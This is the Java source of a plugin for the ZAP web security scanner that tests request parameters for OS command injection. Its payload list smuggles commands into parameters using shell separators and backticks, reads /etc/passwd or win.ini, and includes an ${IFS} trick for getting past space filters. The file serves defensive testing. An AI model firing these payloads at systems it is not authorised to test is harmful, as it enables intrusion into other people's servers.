/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for -the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.ascanrulesBeta;

import java.io.IOException;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.apache.log4j.Logger;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.core.scanner.AbstractAppParamPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.zap.model.Vulnerabilities;
import org.zaproxy.zap.model.Vulnerability;

/**
 * Active Plugin for Command Injection testing and verification.
 * https://www.owasp.org/index.php/Command_Injection
 * 
 * @author yhawke (2013)
 */
public class CommandInjectionPlugin extends AbstractAppParamPlugin {

    // *NIX OS Command constants
    private static final String  NIX_TEST_CMD = "cat /etc/passwd";    
    private static final Pattern NIX_CTRL_PATTERN = Pattern.compile("root:.:0:0"); 
    // Dot used to match 'x' or '!' (used in AIX)
    
    // Windows OS Command constants
    private static final String  WIN_TEST_CMD = "type %SYSTEMROOT%\\win.ini";
    private static final Pattern WIN_CTRL_PATTERN = Pattern.compile("\\[fonts\\]");
    
    // Useful if space char isn't allowed by filters
    // http://www.blackhatlibrary.net/Command_Injection
    private static final String BASH_SPACE_REPLACEMENT = "${IFS}";
    
    // OS Command payloads for command Injection testing
    private static final Map<String, Pattern> OS_PAYLOADS = new LinkedHashMap();
    static {
        // No quote payloads
        OS_PAYLOADS.put("&" + NIX_TEST_CMD + "&", NIX_CTRL_PATTERN);
        OS_PAYLOADS.put(";" + NIX_TEST_CMD + ";", NIX_CTRL_PATTERN);
        OS_PAYLOADS.put("&" + WIN_TEST_CMD, WIN_CTRL_PATTERN);
        OS_PAYLOADS.put("|" + WIN_TEST_CMD, WIN_CTRL_PATTERN);
        
        // Double quote payloads
        OS_PAYLOADS.put("\"&" + NIX_TEST_CMD + "&\"", NIX_CTRL_PATTERN);
        OS_PAYLOADS.put("\";" + NIX_TEST_CMD + ";\"", NIX_CTRL_PATTERN);
        OS_PAYLOADS.put("\"&" + WIN_TEST_CMD + "&\"", WIN_CTRL_PATTERN);
        OS_PAYLOADS.put("\"|" + WIN_TEST_CMD, WIN_CTRL_PATTERN);
        // Single quote payloads
        OS_PAYLOADS.put("'&" + NIX_TEST_CMD + "&'", NIX_CTRL_PATTERN);
        OS_PAYLOADS.put("';" + NIX_TEST_CMD + ";'", NIX_CTRL_PATTERN);
        OS_PAYLOADS.put("'&" + WIN_TEST_CMD + "&'", WIN_CTRL_PATTERN);
        OS_PAYLOADS.put("'|" + WIN_TEST_CMD, WIN_CTRL_PATTERN);
        
        // Special payloads   
        OS_PAYLOADS.put("\n" + NIX_TEST_CMD + "\n", NIX_CTRL_PATTERN);  //force enter
        OS_PAYLOADS.put("`" + NIX_TEST_CMD + "`", NIX_CTRL_PATTERN);    //backtick execution
        OS_PAYLOADS.put("||" + NIX_TEST_CMD, NIX_CTRL_PATTERN);         //or control concatenation
        OS_PAYLOADS.put("&&" + NIX_TEST_CMD, NIX_CTRL_PATTERN);         //and control concatenation
        OS_PAYLOADS.put("|" + NIX_TEST_CMD + "#", NIX_CTRL_PATTERN);    //pipe & comment
        // FoxPro for running os commands (thanks to W3AF)
        OS_PAYLOADS.put("run " + WIN_TEST_CMD, WIN_CTRL_PATTERN);
        
        //Used for *nix
        //OS_PAYLOADS.put("\"|\"ld", null);
        //OS_PAYLOADS.put("'|'ld", null);
    };
    
    // Logger instance
    private static final Logger log 
            = Logger.getLogger(CommandInjectionPlugin.class);

    // Get WASC Vulnerability description
    private static final Vulnerability vuln 
            = Vulnerabilities.getVulnerability("wasc_31");

    /**
     * Get the unique identifier of this plugin
     * @return this plugin identifier
     */
    @Override
    public int getId() {
        return 90020;
    }

    /**
     * Get the name of this plugin
     * @return the plugin name
     */
    @Override
    public String getName() {
        return Constant.messages.getString("ascanbeta.cmdinjection.name");
    }
    
    /**
     * Give back specific pugin dependancies (none for this)
     * @return the list of plugins that need to be executed before
     */
    @Override
    public String[] getDependency() {
        return new String[]{};
    }

    /**
     * Get the description of the vulnerbaility when found
     * @return the vulnerability description
     */
    @Override
    public String getDescription() {
        return Constant.messages.getString("ascanbeta.cmdinjection.desc");
    }

    /**
     * Give back the categorization of the vulnerability 
     * checked by this plugin (it's an injection category for CODEi)
     * @return a category from the Category enum list 
     */    
    @Override
    public int getCategory() {
        return Category.INJECTION;
    }

    /**
     * Give back a general solution for the found vulnerability
     * @return the solution that can be put in place
     */
    @Override
    public String getSolution() {
        if (vuln != null) {
            return vuln.getSolution();
        }
        
        return "Failed to load vulnerability solution from file";    
    }

    /**
     * Reports all links and documentation which refers to this vulnerability
     * @return a string based list of references
     */
    @Override
    public String getReference() {
        return "http://cwe.mitre.org/data/definitions/78.html\n"
                + "https://www.owasp.org/index.php/Command_Injection";
    }

    /**
     * http://cwe.mitre.org/data/definitions/78.html
     * @return the official CWE id
     */
    @Override
    public int getCweId() {
        return 78;
    }

    /**
     * http://projects.webappsec.org/w/page/13246950/OS%20Commanding
     * @return the official WASC id
     */
    @Override
    public int getWascId() {
        return 31;
    }

    /**
     * Give back the risk associated to this vulnerability (high)
     * @return the risk according to the Alert enum
     */
    @Override
    public int getRisk() {
        return Alert.RISK_HIGH;
    }    

    /**
     * Initialize the plugin according to
     * the overall environment configuration
     */
    @Override
    public void init() {
        // do nothing
    }

    /**
     * Scan for OS Command Injection Vulnerabilites
     * 
     * @param msg a request only copy of the original message (the response isn't copied)
     * @param parameter the parameter name that need to be exploited
     * @param value the original parameter value
     */
    @Override
    public void scan(HttpMessage msg, String paramName, String value) {

        // Begin plugin execution
        if (log.isDebugEnabled()) {
            log.debug("Checking [" + msg.getRequestHeader().getMethod() + "][" 
                    + msg.getRequestHeader().getURI() 
                    + "], parameter [" + paramName 
                    + "] for OS Command Injection vulnerabilites");
        }
        
        // Number of targets to try
        int targetCount = 0;

        switch (this.getAttackStrength()) {
            case LOW:
                // This works out as a total of 4 reqs / param
                targetCount = 4;
                break;

            case MEDIUM:
                // This works out as a total of 12 reqs / param
                targetCount = 12;
                break;

            case HIGH:
            case INSANE:
                // This works out as a total of 18 reqs / param
                targetCount = OS_PAYLOADS.size();
                break;

            default:
            // Default to off
        }
        
        // ------------------------------------------
        // Start testing OS Command Injection patterns
        // ------------------------------------------
        String payload;
        Iterator<String> it = OS_PAYLOADS.keySet().iterator();
        
        for(int i = 0; it.hasNext() && (i < targetCount); i++) {

            msg = getNewMsg();
            payload = it.next();
            setParameter(msg, paramName, payload);

            if (log.isDebugEnabled()) {
                log.debug("Testing [" + paramName + "] = [" + payload + "]");
            }
            
            try {
                // Send the request and retrieve the response
                sendAndReceive(msg, false);
                                
                // Check if the injected content has been evaluated and printed
                String content = msg.getResponseBody().toString();
                Matcher matcher = OS_PAYLOADS.get(payload).matcher(content);
                if (matcher.find()) {
                    // We Found IT!                    
                    // Fisrt do logging
                    log.info("[OS Command Injection Found] on parameter [" + paramName + "] with payload [" + payload + "]");
                    
                    // Now create the alert message
                    this.bingo(
                            Alert.RISK_HIGH, 
                            Alert.WARNING, 
                            null,
                            paramName,
                            payload, 
                            null,
                            matcher.group(),
                            msg);

                    // All done. No need to look for vulnerabilities on subsequent 
                    // parameters on the same request (to reduce performance impact)
                    return;                 
                }

            } catch (IOException ex) {
                //Do not try to internationalise this.. we need an error message in any event..
                //if it's in English, it's still better than not having it at all.
                log.error("PCommand Injection vulnerability check failed for parameter ["
                    + paramName + "] and payload [" + payload + "] due to an I/O error", ex);
            }
            
            // Check if the scan has been stopped
            // if yes dispose resources and exit
            if (isStop()) {
                // Dispose all resources
                // Exit the plugin
                return;
            }
        }
    }
}
